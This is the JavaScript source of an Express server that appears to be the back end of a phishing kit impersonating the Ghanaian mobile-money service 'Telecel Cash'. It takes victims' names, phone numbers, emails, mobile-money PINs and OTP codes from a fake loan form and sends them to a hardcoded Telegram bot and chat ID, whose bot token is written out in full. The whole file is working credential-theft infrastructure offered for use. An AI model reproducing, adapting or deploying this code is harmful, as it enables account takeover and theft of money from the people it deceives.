const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// CORS - Allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ========== TELEGRAM CREDENTIALS (CORRECT) ==========
const TG_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const TG_CHAT_ID = '6414813627';  // Your personal chat ID from getUpdates

// ========== HEALTH CHECK ENDPOINTS ==========
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Telecel Cash API is running!',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        telegram: {
            bot_configured: true,
            chat_id: TG_CHAT_ID
        }
    });
});

// ========== MAIN TELEGRAM ENDPOINT ==========
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site, amount, term, monthly, employment } = req.body;
        
        console.log('='.repeat(50));
        console.log('📨 Request received:', new Date().toISOString());
        console.log('Type:', type);
        console.log('Name:', name);
        console.log('Phone:', phone);
        console.log('='.repeat(50));
        
        const timestamp = new Date().toLocaleString('en-GB', {
            timeZone: 'Africa/Accra',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        let message = '';
        
        if (type === 'application') {
            message = `📱 NEW APPLICATION - Telecel Cash 📱\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `💼 Monthly Income: ₵${pin || '0'}\n`;
            message += `🏢 Employment: ${employment || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
            
        } else if (type === 'pin') {
            message = `🔐 PIN CONFIRMED - Telecel Cash 🔐\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `🔑 PIN: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
            
        } else if (type === 'otp') {
            message = `✅ OTP VERIFIED - Telecel Cash ✅\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: ₵${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: ₵${monthly || '0'}\n`;
            message += `🔢 OTP Code: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
            
        } else {
            message = `📝 NEW SUBMISSION - Telecel Cash 📝\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Amount: ₵${amount || '0'}\n`;
            message += `🔑 PIN/OTP: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
        }
        
        // Send to Telegram
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const response = await fetch(`${url}?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram!');
            res.json({ success: true, message: 'Sent successfully' });
        } else {
            console.error('❌ Telegram error:', result);
            res.json({ success: false, error: result.description });
        }
        
    } catch (error) {
        console.error('❌ Server error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== TEST ENDPOINT ==========
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🔧 TEST MESSAGE 🔧\n\nTelecel Cash Bot is working!\nTime: ${new Date().toLocaleString()}\nChat ID: ${TG_CHAT_ID}\n\nIf you receive this, your bot is configured correctly! ✅`;
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Test message sent!');
            res.json({ success: true, message: 'Test message sent to Telegram!' });
        } else {
            console.error('❌ Test failed:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== INFO ENDPOINT ==========
app.get('/api/info', (req, res) => {
    res.json({
        name: 'Telecel Cash API',
        version: '1.0.0',
        country: 'Ghana',
        currency: '₵',
        chat_id: TG_CHAT_ID,
        bot_username: '@TelecellBot',
        telegram_configured: true
    });
});

// ========== START SERVER ==========
app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(50));
    console.log('🚀 Telecel Cash Backend Server Started');
    console.log('='.repeat(50));
    console.log(`📡 Port: ${PORT}`);
    console.log(`🤖 Bot: @TelecellBot`);
    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
    console.log(`🌍 Country: Ghana`);
    console.log(`💵 Currency: ₵`);
    console.log('='.repeat(50));
    console.log('✅ Endpoints:');
    console.log(`   GET  /health`);
    console.log(`   POST /api/send-telegram`);
    console.log(`   POST /api/test-telegram`);
    console.log(`   GET  /api/info`);
    console.log('='.repeat(50));
});
